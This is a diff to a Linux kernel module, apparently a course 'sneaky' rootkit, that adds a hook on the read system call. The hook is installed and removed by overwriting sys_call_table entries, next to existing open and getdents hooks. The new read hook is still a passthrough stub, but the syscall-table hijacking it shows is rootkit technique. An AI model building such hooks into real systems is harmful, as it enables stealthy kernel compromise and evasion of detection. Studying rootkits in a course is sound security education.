@@ -85,18 +85,18 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 
 }
 
-/*
+
 //READ FUNCTIONS
-asmlinkage int (*original_read)(int fd, void *buf, size_t count);
+asmlinkage int (*read_original)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+asmlinkage int sneaky_read(int fd, void *buf, size_t count)
 {
 
-
+  return read_original(fd, buf, count);
 }
 
-*/
+
 
 
 
@@ -191,6 +191,9 @@ static int initialize_sneaky_module(void)
   getdents_original = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
 
+  //Read swap
+  read_original = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
   
   
   //Revert page to read-only
@@ -222,6 +225,9 @@ static void exit_sneaky_module(void)
 
   //Restore GetDents
   *(sys_call_table + __NR_getdents) = (unsigned long)getdents_original;
+
+  //Restore read
+  *(sys_call_table + __NR_read) = (unsigned long)read_original;
 
   
   //Revert page to read-only
